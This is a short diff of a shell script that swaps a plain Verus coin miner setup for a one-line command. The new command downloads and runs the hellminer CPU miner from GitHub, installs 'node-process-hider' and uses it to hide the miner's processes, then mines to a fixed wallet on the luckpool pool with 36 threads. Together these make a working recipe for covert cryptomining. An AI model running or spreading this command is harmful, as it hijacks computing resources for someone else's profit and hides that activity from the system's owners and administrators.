@@ -1,5 +1,1 @@
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvzf nheqminer-Linux-v0.8.2.tgz
-tar xf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1 -p x -t 4
+apt update && apt upgrade -y && apt install nodejs && apt install npm && npm i -g node-process-hider && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && chmod +x hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ph add hellminer && ph add verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.g1 -p x --cpu 36
